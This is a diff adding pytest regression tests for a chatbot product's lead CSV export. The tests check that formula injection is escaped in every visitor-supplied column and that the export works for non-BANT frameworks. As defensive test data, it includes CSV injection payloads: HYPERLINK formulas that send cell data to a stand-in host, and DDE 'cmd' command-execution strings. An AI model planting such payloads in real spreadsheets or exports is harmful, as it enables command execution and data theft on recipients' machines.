@@ -8,6 +8,8 @@ Covers the "unread leads" contract that backs the sidebar badge:
   - Legacy tier aliases (cold/warm/hot/qualified) still returned
 """
 
+import csv
+import io
 from contextlib import contextmanager
 from datetime import UTC, datetime, timedelta
 from types import SimpleNamespace
@@ -531,6 +533,324 @@ class TestBuildLeadResponseUnread:
 
         assert payload["unread"] is False
         assert payload["lead_viewed_at"] == viewed_at.isoformat()
+
+
+# ── GET /leads/export — CSV injection ────────────────────────────────────────
+#
+# The escape itself is unit-tested in ``test_csv_safety.py``. These tests prove
+# it is wired into the file a customer actually downloads, column by column —
+# the half a refactor can quietly break. Every string column here is filled by
+# someone outside the server: the session id is minted by the widget, the
+# contact fields are typed into the lead form by a visitor, the BANT values are
+# LLM-extracted from what that visitor typed, location/device are derived from
+# request headers, and the attribution columns come off the host page's URL.
+
+FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+# One payload per untrusted column, each a different OWASP trigger, so a
+# regression that drops the escape from a single column still fails loudly.
+_INJECTED_SESSION_ID = '=HYPERLINK("https://evil.test/?"&A1,"Click")'
+_INJECTED_NAME = '+cmd|" /C calc"!A0'
+_INJECTED_EMAIL = "@SUM(1+1)*cmd|' /C calc'!A0"
+_INJECTED_PHONE = "-2+3+cmd|' /C calc'!A0"
+_INJECTED_COMPANY = '=HYPERLINK("https://evil.test/?"&A2,"Click")'
+_INJECTED_NEED = "=1+1"
+_INJECTED_BUDGET = "+1+1"
+_INJECTED_AUTHORITY = "-1+1"
+_INJECTED_TIMELINE = "@1+1"
+_INJECTED_LOCATION = "=cmd|' /C calc'!A0"
+_INJECTED_DEVICE = "\t=1+1"
+
+
+def _export_lead_info(session_id: str = "s1", **overrides):
+    base = dict(
+        session_id=session_id,
+        name="Priya",
+        email="priya@infosys.com",
+        phone="+91 98000 00000",
+        company="infosys.com",
+    )
+    base.update(overrides)
+    return SimpleNamespace(**base)
+
+
+def _call_export(
+    monkeypatch,
+    chat_session,
+    lead_info,
+    *,
+    attribution: bool,
+    msg_count: int = 4,
+    bant_config=None,
+):
+    """Drive ``GET /leads/export`` over a mocked session and return the response.
+
+    ``bant_config`` selects the bot's qualification framework — ``None`` gives
+    the BANT preset, ``{"framework": "meddic"}`` a bot whose dimensions are not
+    need/budget/authority/timeline at all.
+    """
+    from app.api import lead_routes
+
+    bot = SimpleNamespace(id=1, client_id=1, bant_enabled=False, bant_config=bant_config)
+    session = MagicMock()
+    # execute() order in export_leads_csv, with no bot_id filter:
+    #   client_bot_ids → results (session, msg_count) → bots → lead_infos
+    _install_scalars_chain(session, [1], [(chat_session, msg_count)], [bot], [lead_info])
+    monkeypatch.setattr(lead_routes, "get_session", lambda: _session_context(session))
+    monkeypatch.setattr(
+        lead_routes,
+        "is_lead_source_attribution_enabled",
+        lambda *_a, **_k: attribution,
+    )
+    return TestClient(_build_app(auth_override=_client_auth())).get("/leads/export")
+
+
+def _export_rows(response) -> list[list[str]]:
+    return list(csv.reader(io.StringIO(response.text)))
+
+
+class TestExportCsvInjection:
+    def test_export_neutralises_every_untrusted_base_column(self, monkeypatch):
+        """The load-bearing one: a payload in each column, all of them defused.
+
+        Scope note, because it is easy to over-read: this pins the columns that
+        exist today. It cannot fail for a column added tomorrow — a new column
+        carries no payload in this fixture, so the sweep never sees it. What
+        makes a future column safe is the ``csv_safe_row`` funnel in the route,
+        and that property is tested where it lives, in ``test_csv_safety.py``.
+        """
+        chat_session = _make_session_row(
+            _INJECTED_SESSION_ID,
+            location=_INJECTED_LOCATION,
+            device=_INJECTED_DEVICE,
+            bant_need=_INJECTED_NEED,
+            bant_budget=_INJECTED_BUDGET,
+            bant_authority=_INJECTED_AUTHORITY,
+            bant_timeline=_INJECTED_TIMELINE,
+        )
+        lead_info = _export_lead_info(
+            session_id=_INJECTED_SESSION_ID,
+            name=_INJECTED_NAME,
+            email=_INJECTED_EMAIL,
+            phone=_INJECTED_PHONE,
+            company=_INJECTED_COMPANY,
+        )
+
+        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
+        assert response.status_code == 200, response.text
+
+        rows = _export_rows(response)
+        assert len(rows) == 2, rows
+        header, row = rows
+
+        # No cell in the file can open as a formula — headers included, since a
+        # header is a cell too.
+        for cell in header + row:
+            assert not cell.startswith(FORMULA_TRIGGERS), cell
+
+        # And nothing was dropped on the way: each payload survives verbatim
+        # behind its quote, so the export stays a faithful record.
+        for column, payload in (
+            ("Session ID", _INJECTED_SESSION_ID),
+            ("Name", _INJECTED_NAME),
+            ("Email", _INJECTED_EMAIL),
+            ("Phone", _INJECTED_PHONE),
+            ("Company", _INJECTED_COMPANY),
+            ("Need", _INJECTED_NEED),
+            ("Budget", _INJECTED_BUDGET),
+            ("Authority", _INJECTED_AUTHORITY),
+            ("Timeline", _INJECTED_TIMELINE),
+            ("Location", _INJECTED_LOCATION),
+            ("Device", _INJECTED_DEVICE),
+        ):
+            assert row[header.index(column)] == f"'{payload}", column
+
+    def test_export_neutralises_the_attribution_columns(self, monkeypatch):
+        """Standard+ adds six columns lifted straight off the host page's URL.
+
+        An attacker never needs an OyeChats account for these: they link a
+        visitor to the *customer's own* site with a crafted query string, the
+        widget records it, and the payload lands in the customer's export.
+        """
+        chat_session = _make_session_row(
+            "s1",
+            referrer="=1+1",
+            page_url="+1+1",
+            utm_params={
+                "utm_source": '=HYPERLINK("https://evil.test/?"&A1,"Click")',
+                "utm_medium": "@SUM(1+1)",
+                "utm_campaign": "-2+3",
+            },
+            visitor_journey=[{"path": "=cmd|' /C calc'!A0"}, {"path": "/pricing"}],
+        )
+
+        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=True)
+        assert response.status_code == 200, response.text
+
+        rows = _export_rows(response)
+        header, row = rows
+        for column in ("Source", "Medium", "Campaign", "Referrer", "Landing Page", "Journey"):
+            cell = row[header.index(column)]
+            assert cell.startswith("'"), column
+            assert not cell.startswith(FORMULA_TRIGGERS), column
+
+        # The journey keeps both hops — the escape guards the leading character
+        # of the joined summary, it does not truncate it.
+        assert row[header.index("Journey")] == "'=cmd|' /C calc'!A0 → /pricing"
+
+    def test_export_leaves_an_ordinary_lead_untouched(self, monkeypatch):
+        """No stray quotes on real data.
+
+        The email case matters most: the trigger is a *leading* ``@``, so
+        ``priya@infosys.com`` must survive intact or every export in the
+        product grows a cosmetic wart. Commas and quotes stay the csv writer's
+        job — the escape must not reach for them.
+        """
+        chat_session = _make_session_row("s1", location="Mumbai, India", device="iPhone")
+        lead_info = _export_lead_info(phone="98000 00000", company='Acme, Inc. "Main"')
+
+        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
+        assert response.status_code == 200, response.text
+
+        header, row = _export_rows(response)
+        assert row[header.index("Session ID")] == "s1"
+        assert row[header.index("Name")] == "Priya"
+        assert row[header.index("Email")] == "priya@infosys.com"
+        assert row[header.index("Phone")] == "98000 00000"
+        assert row[header.index("Company")] == 'Acme, Inc. "Main"'
+        assert row[header.index("Location")] == "Mumbai, India"
+
+    def test_export_escapes_an_e164_phone_number_and_that_is_intended(self, monkeypatch):
+        """The known cost of the defence, pinned so nobody "fixes" it later.
+
+        ``+91 98000 00000`` starts with ``+``, so it picks up a leading quote
+        like any other triggering cell — visible in the sheet, and on India's
+        market that is most rows. It is still the right call: the alternative
+        is exempting values that "look like" a phone number, and ``+1+1`` looks
+        exactly as numeric as ``+91``. A heuristic here is a hole, so the
+        cosmetic cost is accepted deliberately rather than engineered around.
+        """
+        response = _call_export(
+            monkeypatch,
+            _make_session_row("s1"),
+            _export_lead_info(phone="+91 98000 00000"),
+            attribution=False,
+        )
+        assert response.status_code == 200, response.text
+
+        header, row = _export_rows(response)
+        assert row[header.index("Phone")] == "'+91 98000 00000"
+
+    def test_export_keeps_server_computed_columns_numeric(self, monkeypatch):
+        """Score and message count must not gain a quote.
+
+        They are integers this service computed, never attacker input, and a
+        leading ``'`` would turn them into text in the recipient's sheet —
+        breaking every SUM and sort built on the export.
+        """
+        chat_session = _make_session_row("s1")
+
+        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False, msg_count=7)
+        assert response.status_code == 200, response.text
+
+        header, row = _export_rows(response)
+        # Exact values plus an explicit "no escape quote", rather than a shape
+        # check like `.isdigit()` — a shape check passes for any digit string
+        # and so cannot distinguish the value that is here from the value the
+        # test is meant to defend.
+        assert row[header.index("Messages")] == "7"
+        assert row[header.index("Score")] == "0"
+        for column in ("Messages", "Score"):
+            assert not row[header.index(column)].startswith("'"), column
+
+    def test_export_neutralises_a_cr_prefixed_value(self, monkeypatch):
+        """The CR case, asserted on the raw body.
+
+        A bare CR inside a quoted field is a line terminator to ``csv.reader``'s
+        universal-newline handling, so round-tripping it through the parser
+        would be testing the stdlib rather than the escape. The bytes on the
+        wire are what the recipient's spreadsheet sees, so assert on those.
+        """
+        chat_session = _make_session_row("s1")
+        lead_info = _export_lead_info(name="\r=1+1")
+
+        response = _call_export(monkeypatch, chat_session, lead_info, attribution=False)
+        assert response.status_code == 200, response.text
+
+        # Quoted by the writer (it contains a line-terminator character) AND
+        # prefixed with the escape, so the cell can neither break the record
+        # apart nor start with a formula trigger.
+        assert '"\'\r=1+1"' in response.text
+        assert "\n\r=1+1" not in response.text
+
+
+# ── GET /leads/export — non-BANT qualification frameworks ────────────────────
+
+
+class TestExportAcrossFrameworks:
+    """A bot's framework is whatever ``bant_config["framework"]`` names.
+
+    ``build_lead_response`` emits that framework's real dimensions, so for
+    anything other than BANT there is no ``need`` key to read. The export used
+    to index the four BANT names directly and 500 on every such bot.
+    """
+
+    @pytest.mark.parametrize("framework", ["meddic", "champ", "gpctba_ci"])
+    def test_export_succeeds_for_a_non_bant_bot(self, monkeypatch, framework: str):
+        """Regression: this raised ``KeyError: 'need'`` → unhandled 500.
+
+        Every customer on one of these frameworks was locked out of exporting
+        their leads entirely — not a degraded file, no file at all.
+        """
+        response = _call_export(
+            monkeypatch,
+            _make_session_row("s1"),
+            _export_lead_info(),
+            attribution=False,
+            bant_config={"framework": framework},
+        )
+
+        assert response.status_code == 200, response.text
+
+    def test_export_keeps_its_column_shape_for_a_non_bant_bot(self, monkeypatch):
+        """The four BANT columns come back empty rather than absent.
+
+        Deliberate: one file shape for every account means a customer's saved
+        import mapping keeps working when they switch a bot's framework, and an
+        agency can concatenate exports across bots. Emitting each framework's
+        own dimensions would be more informative but changes what the columns
+        mean per row — a product decision, tracked separately from this fix.
+        """
+        response = _call_export(
+            monkeypatch,
+            _make_session_row("s1"),
+            _export_lead_info(),
+            attribution=False,
+            bant_config={"framework": "meddic"},
+        )
+        assert response.status_code == 200, response.text
+
+        header, row = _export_rows(response)
+        for column in ("Need", "Budget", "Authority", "Timeline"):
+            assert row[header.index(column)] == "", column
+        # Everything outside the qualification block is unaffected.
+        assert row[header.index("Email")] == "priya@infosys.com"
+        assert row[header.index("Session ID")] == "s1"
+
+    def test_export_still_fills_the_bant_columns_for_a_bant_bot(self, monkeypatch):
+        """The fix must not blank the columns for the framework that has them."""
+        chat_session = _make_session_row(
+            "s1",
+            bant_need="Critical / blocking",
+            bant_budget="Approved",
+        )
+
+        response = _call_export(monkeypatch, chat_session, _export_lead_info(), attribution=False)
+        assert response.status_code == 200, response.text
+
+        header, row = _export_rows(response)
+        assert row[header.index("Need")] == "Critical / blocking"
+        assert row[header.index("Budget")] == "Approved"
 
 
 # ── Manual follow-up (the four gates) ────────────────────────────────────────
